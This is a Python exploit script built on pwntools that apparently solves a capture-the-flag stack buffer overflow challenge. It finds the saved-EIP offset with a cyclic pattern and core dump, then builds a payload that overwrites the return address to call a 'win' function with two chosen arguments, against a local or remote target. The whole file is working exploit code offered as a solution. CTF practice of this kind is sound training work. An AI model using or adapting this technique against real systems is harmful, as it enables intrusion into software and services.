from platform import win32_edition
from pwn import *
import pdb

def conn(elf):
	if args.REMOTE:
		host_raw = args.REMOTE.split()
		host, port = host_raw[0], int(host_raw[1])
		return remote(host, port)
	else:
		return elf.process()


def craft_payload(elf, offset):
	win_function_address = p32(elf.sym.win)
	arg1 = 0xcafef00d
	arg2 = 0xf00df00d

	# pdb.set_trace()
	rop = ROP(elf)
	rop.raw("A" * offset)
	rop.raw(win_function_address)
	rop.raw("B" * 4)
	rop.raw(arg1)
	rop.raw(arg2)
	rop = rop.chain()
	log.debug(f"ROP CHAIN is: {rop}")
	return rop


def get_offset(elf):
	p = elf.process()
	p.sendlineafter(b"string: \n", cyclic(200))
	p.wait()
	core = p.corefile
	offset = cyclic_find(core.eip)
	log.debug(f"OFFSET: {offset}")
	os.system(f"rm {core.path}")
	return offset


elf_path = "vuln"
elf = ELF(elf_path)
offset = get_offset(elf)
payload = craft_payload(elf, offset)

p = conn(elf)
p.sendlineafter(b"string: \n", payload)
res = p.recvall(1)
log.success(str(res.split()[-1]))
